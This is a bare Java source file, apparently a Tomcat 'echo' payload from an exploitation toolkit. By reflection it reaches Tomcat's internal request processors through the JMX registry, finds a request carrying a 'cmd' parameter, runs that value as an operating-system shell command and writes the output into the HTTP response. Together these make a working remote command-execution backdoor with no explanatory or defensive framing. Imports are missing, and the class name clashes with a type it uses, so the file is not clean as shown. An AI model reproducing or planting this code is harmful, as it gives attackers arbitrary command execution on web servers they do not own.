package com.firebasky.echo.controller;



public class MBeanServer {
    public MBeanServer() throws Exception{
        try {
            MBeanServer mbeanServer = Registry.getRegistry(null,null).getMBeanServer();

            String name = mbeanServer.queryNames(new ObjectName("Catalina:type=GlobalRequestProcessor,name=*http*"),null).iterator().next().toString();
            Matcher matcher= Pattern.compile("Catalina:(type=.*),(name=.*)").matcher(name);
            if(matcher.find()) name = matcher.group(2)+","+matcher.group(1);

            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            obj = field.get(obj);

            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap obj2 = (HashMap)field.get(obj);
            obj = ((HashMap)obj2.get("Catalina")).get(name);

            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            obj = field.get(obj);

            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            obj = field.get(obj);

            field = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            field.setAccessible(true);
            ArrayList obj3 = (ArrayList)field.get(obj);

            String pass="cmd";
            for (int k = 0; k < obj3.size(); k++) {
                org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) obj3.get(k);

                if (requestInfo.getCurrentQueryString()!=null && requestInfo.getCurrentQueryString().contains(pass)) {
                    java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
                    requestField.setAccessible(true);
                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);
                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);

                    String cmd = request.getParameter(pass);
                    String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    java.io.Writer writer = request.getResponse().getWriter();
                    java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                    usingWriter.setAccessible(true);
                    usingWriter.set(request.getResponse(), Boolean.FALSE);
                    writer.write(output);
                    writer.flush();

                    break;
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
